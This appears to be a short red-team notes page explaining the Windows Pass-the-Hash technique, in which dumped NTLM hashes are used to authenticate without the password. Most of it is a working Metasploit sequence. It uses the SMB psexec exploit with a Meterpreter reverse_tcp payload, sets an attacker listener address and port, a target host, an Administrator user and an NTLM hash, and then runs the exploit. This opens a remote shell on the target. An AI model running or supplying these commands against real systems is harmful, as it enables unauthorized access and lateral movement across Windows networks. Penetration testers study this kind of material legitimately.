---
title: Pass-the-Hash (PtH) Attack
draft: false
tags:
  - redteam
  - windows
  - passthehash
---
# Pass-the-Hash (PtH) Attacks

Once you have dumped (or otherwise obtained) Windows NTLM hashes, you can use these in an attack known as Pass-the-Hash (PtH). It abuses the NTLM authentication protocol to authenticate as the user with just knowing the hash.

```
meterpreter > use exploit/windows/smb/psexec
meterpreter > set PAYLOAD windows/meterpreter/reverse_tcp
meterpreter > set LHOST 192.168.1.1
meterpreter > set LPORT 8888
meterpreter > set RHOST 10.10.10.10
meterpreter > set SMBUser Administrator
meterpreter > set SMBPass aad3b435b51404eeaad3b435b51404ee:7d3f11711c610f013c06959a5e98f2fd
exploit
```